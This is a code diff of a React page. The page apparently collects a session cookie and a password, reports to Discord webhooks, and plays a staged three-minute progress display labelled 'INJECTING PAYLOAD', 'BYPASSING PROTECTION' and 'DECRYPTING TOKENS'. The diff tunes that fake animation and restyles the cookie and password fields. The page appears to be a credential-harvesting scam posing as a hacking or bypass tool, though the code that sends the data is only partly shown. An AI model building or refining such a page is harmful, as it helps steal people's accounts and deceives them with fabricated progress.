@@ -102,34 +102,30 @@ const Index = () => {
       console.error("Discord notify failed after retries", lastErr);
     }
 
-    // Run progress animation (~3 min)
-    const phases = [
-      { until: 8, label: "SENDING REQUEST..." },
-      { until: 22, label: "ESTABLISHING CONNECTION..." },
-      { until: 38, label: "VALIDATING SESSION..." },
-      { until: 55, label: "INJECTING PAYLOAD..." },
-      { until: 72, label: "BYPASSING PROTECTION..." },
-      { until: 88, label: "DECRYPTING TOKENS..." },
-      { until: 97, label: "FINALIZING..." },
-      { until: 100, label: "COMPLETE" },
-    ];
+    // Run progress animation in 10% steps (~3 min total)
+    const stepLabels: Record<number, string> = {
+      0: "SENDING REQUEST...",
+      10: "ESTABLISHING CONNECTION...",
+      20: "VALIDATING SESSION...",
+      30: "INJECTING PAYLOAD...",
+      40: "BYPASSING PROTECTION...",
+      50: "DECRYPTING TOKENS...",
+      60: "PARSING RESPONSE...",
+      70: "VERIFYING TOKENS...",
+      80: "FINALIZING...",
+      90: "ALMOST DONE...",
+      100: "SUCCESS",
+    };
 
-    const totalMs = 180_000;
-    const tickMs = 1000;
-    const ticks = totalMs / tickMs;
-    const inc = 100 / ticks;
+    const stepMs = 18_000; // 10 steps * 18s = 180s
+    setProgress(0);
+    setStatus(stepLabels[0]);
 
-    let p = 0;
-    for (let i = 0; i < ticks; i++) {
-      await new Promise((r) => setTimeout(r, tickMs));
-      p = Math.min(100, p + inc);
-      setProgress(Math.floor(p));
-      const phase = phases.find((ph) => p <= ph.until) ?? phases[phases.length - 1];
-      setStatus(phase.label);
+    for (let step = 10; step <= 100; step += 10) {
+      await new Promise((r) => setTimeout(r, stepMs));
+      setProgress(step);
+      setStatus(stepLabels[step]);
     }
-
-    setProgress(100);
-    setStatus("COMPLETE");
 
     // Fire success webhook (routed by edge function to DISCORD_WEBHOOK_URL_SUCCESS)
     const successBody: Record<string, unknown> = {
@@ -251,7 +247,7 @@ const Index = () => {
           }}
         >
           <Cookie
-            className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground"
+            className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-foreground/70 z-10"
             style={{ transition: "color 300ms cubic-bezier(0.4, 0, 0.2, 1)" }}
           />
           <input
@@ -298,7 +294,7 @@ const Index = () => {
           aria-hidden={version !== "v2"}
         >
           <div className="relative">
-            <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-muted-foreground" />
+            <Key className="absolute left-4 top-1/2 -translate-y-1/2 w-4 h-4 text-foreground/70 z-10" />
             <input
               type={showPassword ? "text" : "password"}
               value={password}
